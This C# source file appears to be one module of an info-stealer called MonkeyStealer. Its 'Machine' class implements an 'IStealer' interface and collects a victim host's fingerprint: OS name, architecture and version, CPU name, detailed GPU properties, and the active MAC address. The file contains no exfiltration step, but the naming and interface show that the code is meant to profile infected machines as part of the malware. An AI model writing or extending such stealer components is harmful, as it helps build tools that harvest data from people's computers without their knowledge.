using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.CompilerServices;
using System.Net.NetworkInformation;
using System.Management;
using MonkeyStealer.scripts;

namespace MonkeyStealer.scripts
{
    public class Machine : IStealer
    {
        public static object System { get; internal set; }
        
        public List<string> Steal()
        {
            List<string> infos = new List<string>();
            infos.Add(GetOsInfos("os")); infos.Add(GetOsInfos("arch")); infos.Add(GetOsInfos("osv"));
            infos.Add(GetCpuInfos());
            infos.Add(GetGpuInfos());
            infos.Add(getMacAddress());
            return infos;
        }
        
        // getting OS informations
        public string GetOsInfos(string param)
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            // mo = management object
            foreach (ManagementObject? mo in mos.Get())
            {
                switch (param)
                {
                    case "os":
                        return mo["Caption"]?.ToString() ?? "";
                    // Arch = architecture
                    case "arch":
                        return mo["OSArchitecture"]?.ToString() ?? "";
                    // Osv = version du système d'exploitation
                    case "osv":
                        return mo["CSDVersion"]?.ToString() ?? "";
                }
            }
            return "";
        }
        public string GetCpuInfos()
        {
            RegistryKey processor_name = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0",RegistryKeyPermissionCheck.ReadSubTree);
            if (processor_name != null)
            {
                return processor_name.GetValue("ProcessorNameString").ToString();
            }
            return "";
        }
        public string GetGpuInfos()
        {
            string infos = "";
            using (var searcher = new ManagementObjectSearcher("select * from Win32_Videocontroller"))
            {
                foreach (ManagementObject? obj in searcher.Get())
                {
                    infos = "Name - " + obj["Name"] + "\n" + "DeviceID - " + obj["DeviceID"] + "\n" + "AdapterRAM - " + obj["AdapterRAM"] + "\n" + "AdapterDACType - " + obj["AdapterDACType"] + "\n" + "Monochrome - " + obj["Monochrome"] + "\n" + "InstalledDisplayDrivers - " + obj["InstalledDisplayDrivers"] + "\n" + "DriverVersion - " + obj["DriverVersion"] + "\n" + "VideoProcessor - " + obj["VideoProcessor"] + "\n" + "VideoArchitecture - " + obj["VideoArchitecture"] + "\n" + "VideoMemoryType - " + obj["VideoMemoryType"];
                } 
            }
            return infos;
        }
        public string getMacAddress()
        {
            string firstMacAddress = NetworkInterface
            .GetAllNetworkInterfaces()
            .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            .Select(nic => nic.GetPhysicalAddress().ToString())
            .FirstOrDefault();
            return firstMacAddress;
        }
    }
}
